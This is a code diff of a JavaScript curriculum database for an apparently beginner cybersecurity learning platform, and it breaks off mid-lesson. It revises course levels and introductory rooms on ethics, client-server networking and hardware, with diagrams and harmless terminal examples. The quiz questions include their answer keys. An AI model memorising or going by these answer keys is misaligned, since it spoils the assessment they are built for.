@@ -1,148 +1,122 @@
 /**
- * Endlessus Learning Hub - Comprehensive Curriculum Database
+ * Endlessus Learning Hub - Pre Security Authoritative Curriculum Database
  * 
- * Auto-compiled from modular curriculum sources.
- * Total Stages: 11
- * Total Core Rooms: 40
- * Total Practical Labs: 13
- * 
- * Designed for zero-knowledge beginners to Junior Penetration Testers.
+ * Auto-generated canonical database covering Levels 0 through 7 (45 Core Rooms).
+ * Features:
+ * - Real educational content, worked examples, and SVG diagrams
+ * - TryHackMe-style Question System (exact answers with visual character slots, multiple choice, hints, explanations)
+ * - Practice terminal integration and lab engine deep links
  */
 
-const ENDLESSUS_STAGES = [
+const PRE_SECURITY_LEVELS = [
   {
     "id": 0,
     "number": "00",
     "title": "Start Here",
-    "tagline": "Welcome & Foundations",
-    "description": "Zero experience required. Discover what cybersecurity is, how ethical hacking works, and run your very first terminal command.",
-    "color": "#10b981",
-    "roomCount": 1,
-    "estimatedTime": "15 min",
+    "tagline": "Welcome to Cybersecurity & Foundations",
+    "description": "Zero prior experience required. Discover what ethical cybersecurity is, understand the legal boundaries, and execute your first shell command.",
+    "color": "#0284c7",
+    "icon": "flag",
+    "roomCount": 2,
+    "estimatedTime": "35 min",
     "difficulty": "Beginner"
   },
   {
     "id": 1,
     "number": "01",
     "title": "Computer Fundamentals",
-    "tagline": "Hardware, OS & Linux",
-    "description": "Understand the machine before defending or testing it: CPU, RAM, OS kernels, Linux filesystem hierarchy, permissions, and process management.",
-    "color": "#06b6d4",
+    "tagline": "Hardware, Storage, Processes & Operating Systems",
+    "description": "Understand the machine before defending it: CPU, RAM, motherboards, filesystems, processes, services, and operating system permissions.",
+    "color": "#0ea5e9",
+    "icon": "memory",
     "roomCount": 4,
-    "estimatedTime": "1 hr 45 min",
+    "estimatedTime": "1 hr 40 min",
     "difficulty": "Beginner"
   },
   {
     "id": 2,
     "number": "02",
-    "title": "Networking Fundamentals",
-    "tagline": "How Computers Communicate",
-    "description": "The core backbone of cybersecurity: networks, IP & MAC addresses, ports, protocols, TCP 3-way handshakes, packets, DNS, and DHCP.",
-    "color": "#3b82f6",
-    "roomCount": 5,
-    "estimatedTime": "2 hr 10 min",
-    "difficulty": "Foundation"
+    "title": "Linux Fundamentals",
+    "tagline": "The Essential Operating System of Security",
+    "description": "Master the Linux command line: filesystem navigation, file management, permissions, process monitoring, pipes, redirection, and bash basics.",
+    "color": "#10b981",
+    "icon": "terminal",
+    "roomCount": 8,
+    "estimatedTime": "3 hr 15 min",
+    "difficulty": "Beginner"
   },
   {
     "id": 3,
     "number": "03",
-    "title": "How the Web Works",
-    "tagline": "Web Architecture, HTTP & Sessions",
-    "description": "Follow the full journey of a web request: DNS to TLS, HTTP methods, headers, status codes, cookies, and stateful session management.",
-    "color": "#6366f1",
-    "roomCount": 3,
-    "estimatedTime": "1 hr 20 min",
-    "difficulty": "Foundation"
+    "title": "Windows Fundamentals",
+    "tagline": "Enterprise Workstations, Processes & PowerShell",
+    "description": "Explore the Windows operating system architecture, NTFS permissions, Task Manager, services, Command Prompt (CMD), and PowerShell essentials.",
+    "color": "#3b82f6",
+    "icon": "desktop_windows",
+    "roomCount": 5,
+    "estimatedTime": "2 hr 10 min",
+    "difficulty": "Beginner"
   },
   {
     "id": 4,
     "number": "04",
-    "title": "Cybersecurity Fundamentals",
-    "tagline": "Security Principles, CIA & Threats",
-    "description": "The mental framework of security: assets, threats, vulnerabilities, the CIA triad, authentication vs authorization, threat types, and cryptography.",
-    "color": "#8b5cf6",
-    "roomCount": 5,
-    "estimatedTime": "2 hr 05 min",
+    "title": "Networking Fundamentals",
+    "tagline": "How Computers Communicate Across the Globe",
+    "description": "The foundational backbone of cyber: LAN/WAN, IP & MAC addresses, subnets, CIDR, TCP/UDP 3-way handshake, ports, DNS, DHCP, and the OSI model.",
+    "color": "#6366f1",
+    "icon": "lan",
+    "roomCount": 9,
+    "estimatedTime": "4 hr",
     "difficulty": "Foundation"
   },
   {
     "id": 5,
     "number": "05",
-    "title": "Security Tools",
-    "tagline": "Practitioner Toolset & Analysis",
-    "description": "Master the essential utilities: Linux security tools, Nmap network scanning, Wireshark packet capture, and security log analysis.",
-    "color": "#ec4899",
-    "roomCount": 4,
-    "estimatedTime": "2 hr 10 min",
-    "difficulty": "Intermediate"
+    "title": "Internet & Web Fundamentals",
+    "tagline": "Browsers, HTTP/S, Headers & Web Architecture",
+    "description": "Learn how the modern web operates: client-server architecture, URLs, HTTP methods, status codes, headers, cookies, TLS/HTTPS, and APIs.",
+    "color": "#8b5cf6",
+    "icon": "public",
+    "roomCount": 5,
+    "estimatedTime": "2 hr 20 min",
+    "difficulty": "Foundation"
   },
   {
     "id": 6,
     "number": "06",
-    "title": "Web Security",
-    "tagline": "OWASP Top Flaws & Defenses",
-    "description": "Explore the most prevalent web application vulnerabilities: SQL Injection, XSS, IDOR, CSRF, authentication flaws, and security headers.",
+    "title": "Cybersecurity Fundamentals",
+    "tagline": "The CIA Triad, Threat Modeling & Defensive Controls",
+    "description": "Understand core security principles: CIA triad, threats vs vulnerabilities vs risks, malware types, authentication vs authorization, hashing, and defense-in-depth.",
     "color": "#f59e0b",
-    "roomCount": 8,
-    "estimatedTime": "4 hr 30 min",
-    "difficulty": "Intermediate"
+    "icon": "security",
+    "roomCount": 6,
+    "estimatedTime": "2 hr 45 min",
+    "difficulty": "Foundation"
   },
   {
     "id": 7,
     "number": "07",
-    "title": "Linux Security",
-    "tagline": "Privilege Escalation & SUID",
-    "description": "Understand root privilege, SUID binaries, misconfigured sudoers, and how standard users identify escalation pathways.",
+    "title": "First Practical Security Labs",
+    "tagline": "Hands-On Investigation in the Simulated Terminal",
+    "description": "Put knowledge into action with hands-on guided exercises: Linux command-line auditing, file permissions, HTTP headers, network recon, and log analysis.",
     "color": "#ef4444",
-    "roomCount": 1,
-    "estimatedTime": "40 min",
-    "difficulty": "Intermediate"
-  },
-  {
-    "id": 8,
-    "number": "08",
-    "title": "Network Security",
-    "tagline": "SMB & Network Services",
-    "description": "Audit enterprise network file shares, identify null sessions, and extract sensitive information from exposed SMB services.",
-    "color": "#14b8a6",
-    "roomCount": 1,
-    "estimatedTime": "35 min",
-    "difficulty": "Intermediate"
-  },
-  {
-    "id": 9,
-    "number": "09",
-    "title": "Modern Security",
-    "tagline": "Tokens, JWT & Cryptanalysis",
-    "description": "Inspect modern stateless authentication tokens (JWTs), identify algorithm flaws, and practice classical cipher cryptanalysis.",
-    "color": "#a855f7",
-    "roomCount": 2,
-    "estimatedTime": "1 hr 10 min",
-    "difficulty": "Intermediate"
-  },
-  {
-    "id": 10,
-    "number": "10",
-    "title": "Junior Pentester",
-    "tagline": "Methodology, Tooling & Capstone",
-    "description": "Synthesize all knowledge into a professional pentest methodology: OSINT recon, web directory fuzzing, Burp Suite, advanced privesc, and a complete capstone engagement.",
-    "color": "#e11d48",
+    "icon": "biotech",
     "roomCount": 6,
-    "estimatedTime": "4 hr 05 min",
-    "difficulty": "Advanced"
+    "estimatedTime": "3 hr 30 min",
+    "difficulty": "Practical"
   }
 ];
 
-const ENDLESSUS_ROOMS = [
+const PRE_SECURITY_ROOMS = [
   {
-    "id": "room-01",
     "stage": 0,
-    "stageTitle": "Stage 0 — Start Here",
-    "title": "Welcome to Cybersecurity",
+    "level": 0,
+    "levelTitle": "Level 0 \u2014 Start Here",
+    "title": "Welcome to Cybersecurity & Ethical Hacking",
     "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
     "estimatedTime": "15 min",
-    "prerequisites": "None (Zero prior knowledge required)",
+    "prerequisites": "None (Absolute zero knowledge required)",
     "whyAreYouHere": "You have arrived at the start of your journey. Cybersecurity can feel intimidating with hundreds of confusing abbreviations, dark terminal windows, and complex tools. In this room, you will demystify what cybersecurity really is, understand how ethical hackers think, and execute your very first command in the Endlessus interactive terminal with zero fear.",
     "objectives": [
       "Understand what cybersecurity is and why it protects the modern digital world",
@@ -178,25 +152,26 @@ const ENDLESSUS_ROOMS = [
         "definition": "A text-based interface that lets you communicate directly with a computer by typing commands."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0b0f19;border-radius:8px;font-family:monospace;\">\n  <rect x=\"20\" y=\"25\" width=\"160\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Learner (You)</text>\n  <text x=\"100\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Input Command</text>\n  <text x=\"100\" y=\"110\" fill=\"#38bdf8\" font-size=\"12\" text-anchor=\"middle\">whoami</text>\n  \n  <path d=\"M 180 80 L 230 80\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"230,80 220,75 220,85\" fill=\"#38bdf8\"/>\n  \n  <rect x=\"230\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"305\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Shell (Bash)</text>\n  <text x=\"305\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Parses Command</text>\n  <text x=\"305\" y=\"110\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Executes /usr/bin</text>\n\n  <path d=\"M 380 80 L 430 80\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"430,80 420,75 420,85\" fill=\"#10b981\"/>\n  \n  <rect x=\"430\" y=\"25\" width=\"150\" height=\"110\" rx=\"6\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"505\" y=\"65\" fill=\"#f8fafc\" font-size=\"14\" font-weight=\"bold\" text-anchor=\"middle\">Linux Kernel</text>\n  <text x=\"505\" y=\"90\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Queries User ID</text>\n  <text x=\"505\" y=\"110\" fill=\"#f59e0b\" font-size=\"12\" text-anchor=\"middle\">Output: cadet</text>\n</svg>",
     "lessons": [
       {
         "title": "1. What is Cybersecurity?",
-        "content": "At its core, cybersecurity is about **trust**. Every day, hospitals manage patient vitals, banks process billions in wire transfers, and electrical grids supply power to millions. All of these run on computers connected together.\n\nWhen these systems have flaws, malicious hackers (often called \"black hats\") can steal private records, disrupt power, or hold businesses for ransom. Cybersecurity professionals exist to identify and fix these flaws first."
+        "content": "At its core, cybersecurity is about **trust**. Every day, hospitals manage patient vitals, banks process billions in wire transfers, and electrical grids supply power to millions. All of these run on computers connected together.\n\nWhen these systems have flaws, malicious hackers (often called 'black hats') can steal private records, disrupt power, or hold businesses for ransom. Cybersecurity professionals exist to identify and fix these flaws first."
       },
       {
         "title": "2. Red Team vs Blue Team: Two Sides of the Shield",
-        "content": "Cybersecurity is broadly divided into two cooperative sides:\n\n• **Offensive Security (Red Team)**: You think like an adversary. You test systems, search for configuration mistakes, verify whether software bugs can be exploited, and report your findings.\n• **Defensive Security (Blue Team)**: You design secure architectures, monitor network traffic, set up firewalls, investigate suspicious activity, and patch vulnerabilities.\n\nBoth teams need the exact same foundational knowledge: **you cannot defend or test what you do not understand**."
+        "content": "Cybersecurity is broadly divided into two cooperative sides:\n\n\u2022 **Offensive Security (Red Team)**: You think like an adversary. You test systems, search for configuration mistakes, verify whether software bugs can be exploited, and report your findings.\n\u2022 **Defensive Security (Blue Team)**: You design secure architectures, monitor network traffic, set up firewalls, investigate suspicious activity, and patch vulnerabilities.\n\nBoth teams need the exact same foundational knowledge: **you cannot defend or test what you do not understand**."
       },
       {
         "title": "3. The Law: Authorization & Scope",
-        "content": "What separates an ethical hacker from a cybercriminal is not technical skill — it is **authorization**.\n\nTesting or probing a system without explicit, written permission from the owner is illegal under computer misuse legislation worldwide. In Endlessus, every lab target is run in a secure, sandboxed environment specifically created for your education. You have full authorization here!"
+        "content": "What separates an ethical hacker from a cybercriminal is not technical skill \u2014 it is **authorization**.\n\nTesting or probing a system without explicit, written permission from the owner is illegal under computer misuse legislation worldwide. In Endlessus, every lab target is run in a secure, sandboxed environment specifically created for your education. You have full authorization here!"
       }
     ],
     "seeExamples": [
       {
         "title": "Interactive Shell: How Commands Work",
         "codeOrDiagram": "cadet@endlessus:~$ whoami\ncadet\n\ncadet@endlessus:~$ date\nSun Oct 05 16:30:00 UTC 2026\n\ncadet@endlessus:~$ echo \"Hello, Cybersecurity!\"\nHello, Cybersecurity!",
-        "explanation": "In a terminal, you type a command next to the prompt (`$`), press Enter, and the operating system responds with text output. Here, `whoami` asks the computer: 'What is my current username?'"
+        "explanation": "In a terminal, you type a command next to the prompt ($), press Enter, and the operating system responds with text output. Here, `whoami` asks the computer: 'What is my current username?'"
       }
     ],
     "tryInteractive": {
@@ -209,7 +184,20 @@ const ENDLESSUS_ROOMS = [
     },
     "questions": [
       {
-        "id": "r1-q1",
+        "id": "q-01-1",
+        "type": "exact",
+        "question": "Which Linux/Unix command returns the active session username?",
+        "visualSlots": "_ _ _ _ _ _",
+        "acceptedAnswers": [
+          "whoami"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "It literally asks 'who am I' as a single lowercase word.",
+        "explanation": "The `whoami` command prints the effective user ID (username) of the current shell session."
+      },
+      {
+        "id": "q-01-2",
         "type": "multiple-choice",
         "question": "What is the single most critical factor that distinguishes an ethical penetration tester from an unauthorized attacker?",
         "options": [
@@ -219,10 +207,11 @@ const ENDLESSUS_ROOMS = [
           "Ethical hackers only test web browsers and never networks"
         ],
         "correctIndex": 1,
+        "hint": "Think about legal permission and boundaries.",
         "explanation": "Authorization is paramount. Without explicit, written permission and clear scope, testing any computer system is illegal."
       },
       {
-        "id": "r1-q2",
+        "id": "q-01-3",
         "type": "multiple-choice",
         "question": "A company hires you to simulate an attack against their customer portal to find vulnerabilities before launch. Which security role are you performing?",
         "options": [
@@ -232,20 +221,8 @@ const ENDLESSUS_ROOMS = [
           "Database Administrator"
         ],
         "correctIndex": 1,
+        "hint": "Offensive testing simulates adversarial attacks.",
         "explanation": "Simulating attacks to discover vulnerabilities is the definition of offensive security (Red Teaming / penetration testing)."
-      },
-      {
-        "id": "r1-q3",
-        "type": "command-interpretation",
-        "question": "What does the command `whoami` return when run in a Linux or Windows terminal?",
-        "options": [
-          "The current IP address of your network card",
-          "The list of installed programs on the computer",
-          "The username of the account currently running the shell",
-          "The version of the Linux kernel"
-        ],
-        "correctIndex": 2,
-        "explanation": "`whoami` prints the effective user ID (username) of the current shell session."
       }
     ],
     "tasks": [
@@ -261,5524 +238,4934 @@ const ENDLESSUS_ROOMS = [
         ]
       }
     ],
-    "explainResult": "You typed `whoami`. The operating system searched its system path (`/usr/bin/whoami`), ran the program, read the user ID associated with your session process (UID 1001: cadet), printed it to standard output, and closed the process.",
     "securityConnection": "Whenever a penetration tester gains access to an unknown server or terminal, the first command they run is almost always `whoami` or `id`. It instantly tells them whether they landed as an unprivileged user (requiring privilege escalation) or as the supreme administrator (root / SYSTEM).",
-    "completion": {
-      "learned": [
-        "The purpose and societal value of cybersecurity",
-        "The division of labor between Red and Blue teams",
-        "The vital legal boundary of authorization and scope",
-        "How a shell prompt works and interprets commands"
-      ],
-      "practiced": [
-        "whoami",
-        "Interactive terminal command execution",
-        "Using the 5-stage hint system"
-      ]
-    },
+    "id": "room-01",
     "nextRoomId": "room-02"
   },
   {
-    "id": "room-02",
-    "stage": 1,
-    "stageTitle": "Stage 1 — Computer Fundamentals",
-    "title": "How Computers Work",
+    "stage": 0,
+    "level": 0,
+    "levelTitle": "Level 0 \u2014 Start Here",
+    "title": "How Computers & The Internet Work",
     "difficulty": "Beginner",
-    "difficultyBadge": "🟢 Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
     "estimatedTime": "20 min",
-    "prerequisites": "Room 01 (Welcome to Cybersecurity)",
-    "whyAreYouHere": "You cannot secure or attack a computer if you don't know what happens inside the box. Before looking at exploits, you need to understand the physical and logical components: how binary data travels through the motherboard, how the CPU executes machine instructions, and why RAM is fundamentally different from hard drive storage.",
+    "prerequisites": "Room 01: Welcome to Cybersecurity & Ethical Hacking",
+    "whyAreYouHere": "Before you can secure a system or spot security flaws, you must understand how computers send and receive information across the world. When you click a link, billions of electrical and optical signals travel through undersea cables, routers, and switches in milliseconds. In this room, you will learn the high-level picture of digital communication.",
     "objectives": [
-      "Understand the primary hardware components: CPU, RAM, Storage, and Motherboard",
-      "Learn how binary (0s and 1s) represents text, numbers, and machine instructions",
-      "Differentiate between volatile memory (RAM) and non-volatile persistence (SSD/HDD)",
-      "Understand what happens when a program is loaded from disk into memory to become a process"
+      "Understand the difference between hardware, software, and firmware",
+      "Learn the Client-Server model of computing",
+      "Differentiate the Internet (the physical highway) from the World Wide Web (the traffic)",
+      "Understand how data is split into small packets for transmission",
+      "Recognize basic internet infrastructure: Clients, Servers, Routers, and Undersea Cables"
+    ],
+    "vocabulary": [
+      {
+        "term": "Client",
+        "definition": "A device (like your phone or laptop) that requests information or services from a server."
+      },
+      {
+        "term": "Server",
+        "definition": "A powerful computer dedicated to storing data, hosting applications, and responding to client requests 24/7."
+      },
+      {
+        "term": "Packet",
+        "definition": "A small segment of a larger message sent across a network, containing both data and routing headers."
+      },
+      {
+        "term": "Router",
+        "definition": "A specialized networking device that inspects packet destination addresses and routes them along the fastest path."
+      },
+      {
+        "term": "Internet",
+        "definition": "The global physical network of interconnected computers, cables, and satellites."
+      },
+      {
+        "term": "World Wide Web (WWW)",
+        "definition": "An information system of interlinked hypertext documents and multimedia accessed via the Internet using HTTP."
+      }
+    ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 160\" width=\"100%\" height=\"160\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:monospace;\">\n  <rect x=\"30\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"105\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Web Browser</text>\n  <text x=\"105\" y=\"95\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">(Client)</text>\n\n  <!-- Request -->\n  <line x1=\"180\" y1=\"60\" x2=\"420\" y2=\"60\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <polygon points=\"420,60 410,55 410,65\" fill=\"#38bdf8\"/>\n  <text x=\"300\" y=\"52\" fill=\"#38bdf8\" font-size=\"11\" text-anchor=\"middle\">GET /login.html HTTP/1.1</text>\n\n  <!-- Response -->\n  <line x1=\"420\" y1=\"100\" x2=\"180\" y2=\"100\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <polygon points=\"180,100 190,95 190,105\" fill=\"#10b981\"/>\n  <text x=\"300\" y=\"118\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">HTTP/1.1 200 OK (HTML Payload)</text>\n\n  <rect x=\"420\" y=\"30\" width=\"150\" height=\"100\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"495\" y=\"70\" fill=\"#f8fafc\" font-size=\"13\" font-weight=\"bold\" text-anchor=\"middle\">Nginx Server</text>\n  <text x=\"495\" y=\"95\" fill=\"#10b981\" font-size=\"11\" text-anchor=\"middle\">Port 80 / 443</text>\n</svg>",
+    "lessons": [
+      {
+        "title": "1. The Client-Server Architecture",
+        "content": "Most of the internet operates on the **Client-Server model**:\n\n1. **The Client**: Your web browser (Chrome, Firefox, Safari) running on your computer or phone. It sends a **Request**.\n2. **The Server**: A machine in a datacenter running software like Nginx, Apache, or Node.js. It receives your request, processes it, and returns a **Response**.\n\nEvery time you load Endlessus, your browser is the client, and our hosting server provides the web pages."
+      },
+      {
+        "title": "2. The Internet vs The World Wide Web",
+        "content": "Many beginners confuse the Internet and the Web, but they are not the same thing:\n\n\u2022 **The Internet** is the massive physical and logical infrastructure: undersea fiber-optic cables, satellites, copper wires, and routers connecting billions of computers together (the highway).\n\u2022 **The World Wide Web (Web)** is just one service that runs on top of the Internet: websites, HTML pages, and web applications accessed via browsers (the cars driving on the highway).\n\nOther services that run on the Internet include email (SMTP/IMAP), file transfer (FTP/SFTP), gaming servers, and streaming."
+      },
+      {
+        "title": "3. How Data Travels: Packets",
+        "content": "When you download a 10MB image, the server doesn't send it as one giant continuous block. If even a single byte were lost, the whole file would need to be retransmitted!\n\nInstead, the operating system chops the image into thousands of tiny chunks called **packets** (typically 1500 bytes each). Each packet gets a label with the source IP address, the destination IP address, and a sequence number. Routers inspect each packet and steer it across the network, and your computer reassembles them back into the image."
+      }
+    ],
+    "seeExamples": [
+      {
+        "title": "Inspecting Packet Routing with Traceroute",
+        "codeOrDiagram": "cadet@endlessus:~$ traceroute endlessus.in\ntraceroute to endlessus.in (104.21.75.12), 30 hops max\n 1  192.168.1.1 (Home Gateway Router)  1.2 ms\n 2  10.200.0.1 (ISP Local Office)       8.4 ms\n 3  172.16.4.1 (Regional Backbone)      14.1 ms\n 4  104.21.75.12 (Destination Edge)     22.3 ms",
+        "explanation": "The `traceroute` utility shows every router (hop) a packet passes through on its way from your computer to the destination server."
+      }
+    ],
+    "tryInteractive": {
+      "type": "terminal",
+      "prompt": "Run `echo \"Clients request, servers respond\"` in the terminal to reinforce the client-server concept:",
+      "initialCommand": "",
+      "expectedCommand": "echo \"Clients request, servers respond\"",
+      "simulatedOutput": "Clients request, servers respond\n[+] Concept verified: Clients initiate requests; servers process and reply.",
+      "explanation": "The `echo` command prints whatever text argument you give it back to standard output."
+    },
+    "questions": [
+      {
+        "id": "q-02-1",
+        "type": "exact",
+        "question": "What is the technical term for the small chunks of data into which files and messages are divided before network transmission?",
+        "visualSlots": "_ _ _ _ _ _ _",
+        "acceptedAnswers": [
+          "packets",
+          "packet"
+        ],
+        "caseSensitive": false,
+        "trimWhitespace": true,
+        "hint": "Starts with 'pack'.",
+        "explanation": "Packets are the discrete units of data transmitted across IP networks."
+      },
+      {
+        "id": "q-02-2",
+        "type": "multiple-choice",
+        "question": "Which of the following correctly describes the relationship between the Internet and the World Wide Web?",
+        "options": [
+          "The Internet and the World Wide Web are identical terms for the exact same technology",
+          "The World Wide Web is the physical hardware cabling, while the Internet is web pages",
+          "The Internet is the global physical infrastructure, while the Web is an application service that runs on top of it",
+          "The World Wide Web was invented before computers were connected via networks"
+        ],
+        "correctIndex": 2,
+        "hint": "Think of the highway vs the cars.",
+        "explanation": "The Internet is the underlying global network of connected computers; the Web (HTTP/HTTPS) is one service operating on top of that infrastructure."
+      }
+    ],
+    "tasks": [
+      {
+        "title": "Task 1: Understand client-server communication",
+        "instruction": "Test output generation in the terminal by echoing a packet status string.",
+        "hints": [
+          "Type: `echo packet`"
+        ]
+      }
+    ],
+    "securityConnection": "In cybersecurity, attackers often target the client-server boundary. For example, Distributed Denial of Service (DDoS) attacks flood a server with millions of bogus packets so legitimate clients cannot connect. Similarly, packet sniffing tools like Wireshark allow security analysts (and attackers) to inspect raw packets passing across an unencrypted network.",
+    "id": "room-02",
+    "nextRoomId": "room-03"
+  },
+  {
+    "stage": 1,
+    "level": 1,
+    "levelTitle": "Level 1 \u2014 Computer Fundamentals",
+    "title": "Computer Hardware & System Architecture",
+    "difficulty": "Beginner",
+    "difficultyBadge": "\ud83d\udfe2 Beginner",
+    "estimatedTime": "25 min",
+    "prerequisites": "Level 0: Start Here",
+    "whyAreYouHere": "To defend or test computers, you must understand physical architecture. Every cybersecurity concept\u2014from buffer overflows and malware execution to disk forensics\u2014ultimately runs on hardware components: CPU registers, RAM memory cells, motherboards, and persistent storage.",
+    "objectives": [
+      "Understand the primary hardware components: CPU, RAM, Storage (SSD/HDD), Motherboard, and Peripherals",
+      "Learn the von Neumann computer architecture and the Fetch-Decode-Execute cycle",
+      "Understand the difference between volatile memory (RAM) and non-volatile storage (SSD/HDD)",
+      "Differentiate 32-bit (x86) and 64-bit (x64) architectures and memory addressing limits",
+      "Recognize how hardware architecture impacts cybersecurity and forensic analysis"
     ],
     "vocabulary": [
       {
         "term": "CPU (Central Processing Unit)",
-        "definition": "The brain of the computer that fetches, decodes, and executes program instructions billions of times per second."
+        "definition": "The 'brain' of the computer that carries out instructions from computer programs through arithmetic, logic, and control operations."
       },
       {
         "term": "RAM (Random Access Memory)",
-        "definition": "Fast, temporary (volatile) workspace memory where active programs and data live while the computer is turned on."
+        "definition": "High-speed, volatile temporary memory used by the CPU to store actively running programs and data. Wiped when powered down."
       },
       {
-        "term": "Storage (SSD/HDD)",
-        "definition": "Persistent (non-volatile) storage that retains your files, operating system, and programs even when powered off."
+        "term": "SSD / HDD (Storage)",
+        "definition": "Non-volatile storage that retains files, operating system code, and data even when power is turned off."
       },
       {
-        "term": "Binary",
-        "definition": "The base-2 numbering system consisting only of 0s and 1s that digital circuits use to represent all information."
+        "term": "Motherboard",
+        "definition": "The main printed circuit board (PCB) connecting the CPU, memory, storage drives, and peripheral expansion cards together."
       },
       {
-        "term": "Program",
-        "definition": "A static collection of compiled instructions stored on disk waiting to be run."
-      },
-      {
-        "term": "Process",
-        "definition": "An actively executing instance of a program loaded into RAM with its own allocated memory space."
+        "term": "Architecture (32-bit vs 64-bit)",
+        "definition": "The width of the CPU registers and memory bus. 32-bit systems can address a maximum of 4 GB of RAM, while 64-bit systems can address billions of gigabytes."
       }
     ],
+    "diagramSvg": "<svg viewBox=\"0 0 600 180\" width=\"100%\" height=\"180\" xmlns=\"http://www.w3.org/2000/svg\" style=\"background:#0f172a;border-radius:8px;font-family:sans-serif;\">\n  <rect x=\"30\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#38bdf8\" stroke-width=\"2\"/>\n  <text x=\"100\" y=\"70\" fill=\"#38bdf8\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">CPU</text>\n  <text x=\"100\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Arithmetic &amp; Logic</text>\n  <text x=\"100\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Executes instructions</text>\n\n  <path d=\"M 170 90 L 230 90\" stroke=\"#38bdf8\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"200\" y=\"80\" fill=\"#38bdf8\" font-size=\"10\" text-anchor=\"middle\">BUS</text>\n\n  <rect x=\"230\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/>\n  <text x=\"300\" y=\"70\" fill=\"#10b981\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">RAM</text>\n  <text x=\"300\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Volatile Memory</text>\n  <text x=\"300\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Fast working set</text>\n\n  <path d=\"M 370 90 L 430 90\" stroke=\"#10b981\" stroke-width=\"3\" stroke-dasharray=\"4\"/>\n  <text x=\"400\" y=\"80\" fill=\"#10b981\" font-size=\"10\" text-anchor=\"middle\">NVMe</text>\n\n  <rect x=\"430\" y=\"30\" width=\"140\" height=\"120\" rx=\"8\" fill=\"#1e293b\" stroke=\"#f59e0b\" stroke-width=\"2\"/>\n  <text x=\"500\" y=\"70\" fill=\"#f59e0b\" font-size=\"16\" font-weight=\"bold\" text-anchor=\"middle\">SSD / Storage</text>\n  <text x=\"500\" y=\"95\" fill=\"#94a3b8\" font-size=\"11\" text-anchor=\"middle\">Non-Volatile</text>\n  <text x=\"500\" y=\"115\" fill=\"#cbd5e1\" font-size=\"10\" text-anchor=\"middle\">Permanent files</text>\n</svg>",
     "lessons": [
       {
-        "title": "1. The Core Architecture",
-        "content": "Every computing device — from a smart thermostat to a cloud server — relies on four primary components:\n• **CPU (The Brain)**: Executes machine instructions in arithmetic, logic, and control loops.\n• **RAM (The Desk)**: Fast working memory. When you open an app, its code and working variables are copied from your drive into RAM so the CPU can read them in nanoseconds. When power turns off, RAM is wiped clean!\n• **Storage (The Filing Cabinet)**: Your NVMe SSD or hard drive. It is slower than RAM but remembers data permanently.\n• **Motherboard (The Nervous System)**: The printed circuit board with high-speed buses connecting CPU, RAM, and storage together."
+        "title": "1. The Core Hardware Triangle: CPU, RAM, and Storage",
+        "content": "A computer fundamentally consists of three interacting systems:\n\n1. **The CPU (Central Processing Unit)**: The computation powerhouse. It executes billions of machine instructions every second (arithmetic, logic, memory jumps).\n2. **RAM (Random Access Memory)**: Ultra-fast volatile memory. When you launch a browser, the binary code is copied from your slow SSD into fast RAM so the CPU can execute it without waiting.\n3. **Storage (NVMe SSD / Hard Disk)**: Permanent, non-volatile storage where your operating system, files, and downloaded tools live.\n\n**Key Forensics Concept**: Turning off a computer completely erases everything in RAM ('volatile memory'). Forensic investigators take 'memory dumps' of running computers before pulling the power cord!"
       },
       {
-        "title": "2. From File on Disk to Active Process",
-        "content": "When you run a program like `nmap`:\n1. **Disk**: The operating system reads the program binary file from storage.\n2. **RAM Allocation**: The OS allocates a block of RAM for code, global variables, stack, and heap.\n3. **CPU Execution**: The CPU's Instruction Pointer points to the program entry point and begins executing assembly instructions one by one."
+        "title": "2. 32-Bit vs 64-Bit Architecture",
